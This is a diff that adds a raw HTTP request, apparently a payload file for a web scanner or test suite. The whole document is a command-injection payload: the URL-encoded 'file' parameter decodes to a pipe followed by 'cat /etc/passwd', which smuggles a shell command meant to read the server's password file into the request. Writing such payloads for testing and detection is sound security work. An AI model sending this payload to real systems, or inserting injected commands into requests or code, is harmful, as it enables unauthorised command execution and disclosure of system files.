@@ -1,0 +1,4 @@
+GET /a?file=%7C%2Bcat%2B%2Fetc%2Fpasswd HTTP/1.1
+Host: demo.example.com
+Connection: close
+
